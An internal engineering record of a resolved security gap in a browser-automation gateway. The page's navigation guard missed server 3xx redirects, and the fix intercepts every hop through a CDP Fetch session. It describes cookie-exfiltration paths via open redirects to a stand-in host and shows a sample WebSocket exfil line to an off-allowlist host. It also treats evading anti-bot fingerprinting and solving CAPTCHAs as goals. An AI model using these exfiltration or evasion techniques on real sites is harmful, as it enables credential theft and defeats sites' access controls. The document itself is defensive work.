---
title: Navigation guard is bypassed by server 3xx redirects (route.continue follows the chain)
module: browser/navigation-guard
date: 2026-06-23
problem_type: architecture_gap
component: policy-enforcement
severity: high
symptoms:
  - "A server 302/3xx from an allowlisted (or credential-owner) host to a non-allowlisted/sibling host is followed without the navigation guard re-firing on the redirected hop"
  - "A retained SSO parent cookie (.example.com) rides a 302 from accounts.example.com to evil.example.com — the R4 no-exfil the credential clamp targets"
  - "An egress-denied internal host receives a request via a 302 from an allowlisted host (partially mitigated by the container network filter, which is the complementary layer)"
  - "JS location.assign / meta-refresh redirects ARE caught (they re-enter as fresh top-level navigations); only SERVER 3xx redirects evade"
root_cause: framework_behavior
resolution_type: fixed
related_components:
  - policy
  - egress
  - vault
tags: [navigation-guard, redirect, route-continue, cdp-fetch, policy-bypass, no-exfil, egress, resolved]
---

# Navigation guard is bypassed by server 3xx redirects

> **RESOLVED (2026-06-23).** The guard no longer rides Playwright's `context.route` +
> `route.continue()` (which auto-followed redirect chains without re-invoking the handler). It now
> intercepts via a single **browser-level CDP `Fetch` session at the Request stage**, which re-pauses
> **every** redirect hop, so the guard re-decides each hop while `Fetch.continueRequest` keeps the hop
> in Chrome's **native** network stack (TLS/HTTP fingerprint preserved — `route.fetch` would not).
> See "Resolution" below. The original analysis is kept for context.

## What

`PatchrightBrowserCore.setNavigationGuard` (`src/browser/patchright-core.ts:256-289`) intercepts
every request with `context.route("**/*", …)` and, on an `allow` decision, calls
`route.continue()`. **`route.continue()` follows the entire server-redirect chain inside Chrome's
network stack and does NOT re-invoke the route handler for the redirected hops** (Patchright/
Playwright 1.60; `route.fetch` is the API that exposes per-hop redirect control, per its own docs).

So a guard decision is made on the *initial* request only. If an allowed host responds with a
`3xx`, the next hop's request — carrying whatever cookies match its domain — is issued without the
guard ever seeing it.

## Impact (verified live, real Chrome, deterministic)

This is a **pre-existing, gateway-wide** policy-enforcement gap, not specific to the vault:

- **Allowlist bypass:** a `302` from an allowlisted host to a non-allowlisted host is followed; the
  off-allowlist host receives the request.
- **Egress bypass:** a `302` to an egress-denied internal host (`*.internal`, metadata ranges) is
  followed; the denied host receives the request. *Partially* mitigated by the compose-level
  container network filter (the documented complementary layer), so this hop is defense-in-depth-
  covered — but the guard itself does not stop it.
- **Vault no-exfil bypass (U7):** the credential nav-clamp (`guardForCredentialHost`) blocks the
  agent's *direct* navigation to a sibling, but a `302` from the owner host to a same-parent sibling
  carries a retained SSO parent cookie (`.example.com`) to that sibling. The cookie only rides when
  the redirect target is within the cookie's domain scope (Chrome scopes it correctly otherwise), so
  the live exploit requires an **open-redirect on the owner host** — narrower than a direct nav, but
  real. *No live vault exposure today:* the consumer warm-open path is unwired (deferred to U9), so
  nothing opens a credentialed consumer session yet.

## Resolution (what shipped)

`PatchrightBrowserCore.setNavigationGuard` no longer installs `context.route("**/*")`. It installs a
single **browser-level CDP session** (`context.browser().newBrowserCDPSession()`) with
`Fetch.enable({ patterns: [{ requestStage: "Request" }] })` + `Target.setAutoAttach({ flatten: true })`,
and a `Fetch.requestPaused` handler that runs the guard and `continueRequest`/`failRequest`s each
request. Key properties:

- **Per-hop re-assertion.** CDP re-pauses every server-3xx hop (the redirected request comes back as a
  fresh `requestPaused`), so the guard re-decides each hop. Verified live, real Chrome:
  `scripts/validate-redirect-guard.mjs` drives a `owner → owner → off-host` 302 chain through the real
  core and asserts the off-host hop is never served and the guard saw all three hop hosts.
- **Native fingerprint preserved.** `Fetch.continueRequest` (no url/header override) keeps every hop in
  Chrome's own network stack — unlike `route.fetch`/`route.fulfill` (the earlier sketch), which would
  replay through Playwright's API-request stack and change the TLS/HTTP fingerprint this gateway
  depends on. That sketch is **superseded**.
- **One Fetch consumer.** Patchright's `CRNetworkManager` enables Fetch whenever a `context.route` is
  registered, so keeping the route AND adding a raw Fetch session would collide on the `InterceptionId`.
  Removing `context.route` (it was the only consumer in the repo) leaves the CDP session as the sole
  owner.
- **Context-wide coverage.** A per-page attach RACES a popup's first navigation and misses it (proven
  in the auto-attach spike); the browser-level `flatten` auto-attach guards every present + future
  page/popup/frame in one install.
- **Fail-closed** preserved: a missing or throwing guard → `Fetch.failRequest("BlockedByClient")`.
- **isNavigationRequest** is derived as `resourceType === "Document"` (CDP has no such field); the
  TitleCase CDP `resourceType` is lowercased to preserve the audit-log value. Both are unit-tested in
  `test/nav-guard-mapping.test.mjs` (the highest-risk mapping).

## Gating

**This fix gated U9 activation** and is now in place (pending the container stealth gate). Once the
consumer warm-open path is wired (U9), a credentialed session is live and the server-redirect hop would
otherwise be a live cookie-exfil vector against a real stored credential. **Before U9 activates in
prod, this change must pass the container kill-gates** — especially `validate:stealth` (proves the CDP
Fetch backend did not regress the anti-bot fingerprint), plus `validate:proxy-escalation` /
`validate:drive` / `validate:redirect-guard`. The U7 credential clamp depends on this hop closure to be
airtight.

## Known limitations & required Q2 container gates

Surfaced by the multi-lens review of the fix; none is a regression vs the old `context.route` path.

- **WebSocket exfil is unguarded at the browser layer (pre-existing).** The CDP `Fetch` domain does not
  pause WS handshakes, so `new WebSocket("ws://off-allowlist-host/")` reaches the remote without the
  guard seeing it — and on a credentialed session Chrome attaches same-eTLD+1 cookies to that
  handshake. The old `context.route` was equally Fetch-domain-based and WS-blind. The container-network
  egress sidecar (NET_ADMIN) blocks metadata/RFC1918/Tailnet but **not arbitrary public hosts**, so a
  public-host WS exfil with a parent cookie is possible. **Tracked as a U9 co-gate** (close via
  `Network.webSocketCreated` host-check + teardown, or accept the egress sidecar as the boundary and
  document it). Not in this PR's scope (different CDP domain, own validation).
- **Plain `retrieve` path: off-allowlist server-3xx hops now hard-fail.** Re-deciding every hop is the
  point, but a benign cross-host redirect (SSO bounce, vanity→apex) that the old `route.continue`
  silently auto-followed now returns `status=null` for a **narrow-allowlist** consumer → `nav-failed` →
  may trigger pointless proxy escalation. A `*` allowlist is unaffected. **Q2 must exercise `retrieve`
  against a real redirecting target**; mitigations (widen the consumer allowlist to known redirect
  targets, or distinguish `ERR_BLOCKED_BY_CLIENT` from a dead exit so it doesn't escalate) are a
  follow-up if a fleet consumer needs it.
- **Child-target coverage (popup/OOPIF/worker) rests on browser-session Fetch propagation under
  `flatten` auto-attach** — empirically confirmed on Mac for popups, new pages, a cross-site OOPIF's
  subresources, and a dedicated Worker's fetch (no deadlock), on both channels, by the review spikes +
  `validate-redirect-guard.mjs`. This is a Chromium-version-sensitive implementation detail, so
  **`validate:redirect-guard` (popup + worker legs) is a required gate on any browser-engine bump**, and
  the Q2 container run should add a cross-origin OOPIF off-host case (needs a third loopback alias, e.g.
  `127.0.0.2`, which the Mac run omits). If the container ever shows a child-target leak, switch to an
  explicit `Target.attachedToTarget → Fetch.enable` per non-worker child (Patchright's own pattern).
- **`validate:stealth` is now guard-on.** It previously ran the *unguarded* `render()` path and so could
  not prove the CDP-Fetch backend's fingerprint effect; it now installs an allow-all guard on every leg
  (prod parity), with `BGW_STEALTH_NO_GUARD=1` for a guard-off A/B baseline. This is the load-bearing
  Q2 fingerprint check.

## Why it is its own unit (not folded into U7)

- **High blast radius:** it changes how *every* request in the gateway is intercepted (one
  browser-level CDP `Fetch` session instead of `context.route`), affecting render, drive, the CAPTCHA
  solve path, proxy handling, and — critically — the **stealth surface** anti-bot vendors inspect.
- **Must clear the real-browser gates:** the change has to pass the stealth kill-gate
  (`validate-stealth.mjs`), proxy-escalation, and drive validators in the container before merge —
  validation that cannot run on the dev Mac. Landing it blind in the U7 PR would risk the core
  bypass path the whole gateway depends on.

## See also

- `interactive-drive-verbs-over-policy-guard.md` — the below-the-verb-layer guard model this gap
  lives in.
- U7 plan `docs/plans/2026-06-22-002-credential-vault-plan.local.md` (R4 no-exfil) — the credential
  clamp depends on this fix to be airtight against a server-redirect vector.
